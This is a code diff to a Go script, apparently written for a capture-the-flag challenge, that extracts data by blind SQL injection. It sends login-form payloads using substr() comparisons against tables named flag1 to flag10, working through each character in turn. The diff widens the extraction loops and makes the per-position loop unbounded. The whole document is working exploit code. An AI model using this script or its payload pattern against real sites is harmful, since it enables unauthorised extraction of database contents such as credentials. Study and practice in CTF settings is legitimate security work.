@@ -5,9 +5,7 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
-	"os"
 	"strings"
-	"time"
 )
 
 var charTable = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \t\n\r!#$%&\\'()*+,-./:;<=>?@[\\]^_`{|}~"
@@ -36,7 +34,7 @@ func main() {
 	}()*/
 
 	valueTable2 := make(map[string]string)
-	/*target := []string{
+	target := []string{
 		"flag1",
 		"flag2",
 		"flag3",
@@ -49,17 +47,14 @@ func main() {
 		"flag10",
 	}
 	for _, v := range target {
-		for offset := 0; offset <= 20; offset++ {
-			go GetValue(offset, url, method, v, &valueTable2)
+		for offset := 0; offset <= 300; offset++ {
+			GetValue(offset, url, method, v, &valueTable2)
 		}
-		time.Sleep(time.Millisecond * 1000)
 	}
-	*/
-
-	for offset := 0; offset <= 20; offset++ {
-		GetValue(offset, url, method, os.Args[1], &valueTable2)
-	}
-	time.Sleep(time.Millisecond * 1000)
+	//for offset := 0; offset <= 20; offset++ {
+	//	GetValue(offset, url, method, os.Args[1], &valueTable2)
+	//}
+	//time.Sleep(time.Millisecond * 1000)
 
 	/*
 		valueTable := make(map[string]string)
@@ -130,7 +125,7 @@ func GetColumn(offset int, url, method, table string) (bool, string) {
 
 func GetValue(offset int, url, method, table string, valueTable *map[string]string) (bool, string) {
 	result := ""
-	for posi := 0; posi < 3000; posi++ {
+	for posi := 0; ; posi++ {
 		for i := range charTable {
 			input := fmt.Sprintf(
 				"ctf_username=admin&ctf_password=' or substr((select * from %s limit %d,1),%d,1)='%s' --",
@@ -146,7 +141,7 @@ func GetValue(offset int, url, method, table string, valueTable *map[string]stri
 					log.Println("Value(", table, " ", offset, "): ", strings.Trim(result, "&"))
 					return true, strings.Trim(result, "&")
 				}
-				log.Printf("Get: posi=%d, char=%s", posi, string(charTable[i]))
+				//log.Printf("Get: posi=%d, char=%s", posi, string(charTable[i]))
 				break
 			}
 			if i >= len(charTable)-1 {
